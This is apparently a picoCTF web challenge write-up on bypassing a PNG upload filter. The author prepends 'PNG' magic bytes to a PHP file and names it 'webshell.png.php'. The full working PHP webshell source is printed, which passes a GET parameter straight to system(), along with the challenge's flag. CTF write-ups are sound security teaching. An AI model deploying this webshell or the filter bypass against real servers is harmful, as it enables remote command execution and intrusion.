Difficulty: Medium

AUTHOR: JUNIAS BONOU

Description
I found a web app that can help process images: PNG images only!

SOLUTION:

1. The first thing I did was to upload a legitmiate PNG image to the website, this returned the following output:

'File uploaded successfully and is a valid PNG file. We shall process it and get back to you... Hopefully'

2. As this didnt actually give me anything, I scanned the address with nmap (vulnerablitiy script) aswell with gobuster.
Gobuster gave me the following directories:

/robots.txt
/uploads
/instructions.txt

3. Going to instructions it states that

Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.

4. This means that I do not necessarily need to upload a .png file, just a file with the png hex prefix and '.png' in the filename.

5. The next thing I did was to go into Burpsuite and capture a upload request, to see if modifying would give me any low hanging fruit. 

Removing the content from 'name' within the WebkitFormBoundry gave me insight into this webpage is using php, as I recieved this error:

<html>
<head>
    <title>File Upload Page</title>
</head>
<body>
    <h1>Welcome to my PNG processing app</h1>

    <br />
<b>Warning</b>:  Undefined array key "file" in <b>/var/www/html/index.php</b> on line <b>12</b><br />
<br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/var/www/html/index.php</b> on line <b>12</b><br />
<br />
<b>Warning</b>:  Undefined array key "file" in <b>/var/www/html/index.php</b> on line <b>13</b><br />
<br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/var/www/html/index.php</b> on line <b>13</b><br />
Error: File name does not contain '.png'.
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" accept=".png">
        <input type="submit" value="Upload File">
    </form>
</body>
</html>

6. Now, I was sure that this meant to use php code disguised as a .png file in order to try and read the flag. I attempted some code from CHATgpt in order to
read files within this directory however this did not work. Looking up 'php webshell code' on google led me to this git repo:

'https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985'

7. Copying the code from here, along with appending '50 4E 47' to the start (cat hex.bin webshell.php > webshell.png.php) gave me this content:


PNG<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>

8. After uploading this to the website, and visting /uploads/webshell.png.php I was given a shell execution box. 
After querying the directory structure, I commanded 'cat ../HFQWKODGMIYTO.txt' to retirve the flag:

/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17} */
